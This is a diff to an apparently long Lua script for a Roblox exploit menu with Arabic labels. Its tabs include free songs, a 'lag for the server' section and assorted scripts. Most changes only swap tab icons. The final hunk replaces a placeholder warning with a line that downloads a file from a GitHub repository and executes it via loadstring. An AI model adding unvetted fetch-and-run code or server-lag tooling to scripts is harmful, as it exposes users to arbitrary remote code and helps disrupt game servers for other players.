@@ -6789,7 +6789,7 @@ end
 -- إنشاء التبويب
 local TabMusic = Window:MakeTab({
     Name = "اغاني مجانية",
-    Icon = "rbxassetid://83114982417764" -- يمكنك تغيير الأيقونة
+    Icon = "music" -- يمكنك تغيير الأيقونة
 })
 
 -- قائمة الصوتيات
@@ -7050,7 +7050,7 @@ task.wait(0.1)
 -- ==================== 3. تبويب: لاق للسيرفر (Tablag) ====================
 local Tablag = Window:MakeTab({
     Name = "لاق للسيرفر",
-    Icon = "rbxassetid://83114982417764"
+    Icon = "bomb"
 })
 
 -- ==================== قسم: لاق بالابتوب ====================
@@ -7200,7 +7200,7 @@ Tablag:AddParagraph("ملاحظات اللاق", "انتظر حوالي 35 ثا�
 -- ==================== 7. تبويب: سكربتات متنوعة ====================
 local ScriptsTab = Window:MakeTab({
     Name = "سكربتات متنوعة",
-    Icon = "rbxassetid://1234567890"
+    Icon = "plane"
 })
 
 ScriptsTab:AddSection({
@@ -7245,7 +7245,6 @@ ScriptsTab:AddButton({
 ScriptsTab:AddButton({
     Name = "تحكم بالسيارات",
     Callback = function()
-        warn("رابط التحكم بالسيارات غير متوفر")
-        -- لم يتم تحميل الملف من الرابط
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/SAZXHUB/Control-update/main/README.md", true))()
     end
 })
